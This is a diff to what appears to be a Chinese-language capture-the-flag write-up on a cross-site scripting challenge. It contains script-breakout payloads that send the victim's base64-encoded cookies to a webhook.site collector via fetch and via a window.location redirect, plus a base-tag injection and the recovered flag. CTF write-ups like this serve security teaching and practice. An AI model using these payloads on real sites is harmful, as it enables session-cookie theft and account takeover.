@@ -87,7 +87,7 @@
 2. 嘗試輸入 `"</script>; <script>alert(1) </script>` -> 成功！
 3. 開 webhook，在 Note 區輸入
    ```js
-   `"</script>; <script>
+   "</script>; <script>
 		fetch("https://webhook.site/[臨時網址]?aaa="+btoa(document.cookie))
 	</script>
    ```
@@ -114,4 +114,17 @@
    ![[W6-3_aaa.png]]
 3. base64 decode ->flag=`CTF{xss3_62601b11047ff0d70cb19208}`
 
+---
 
+
+
+```js
+<base href="https://webhook.site/ee6ce1e6-6618-4b83-8bc4-ec01d7013bfd">
+<script>alert(1)</script>
+
+
+";
+<script>
+window.location = "https://webhook.site/ee6ce1e6-6618-4b83-8bc4-ec01d7013bfd?aaa="+btoa(document.cookie)
+</script>
+```
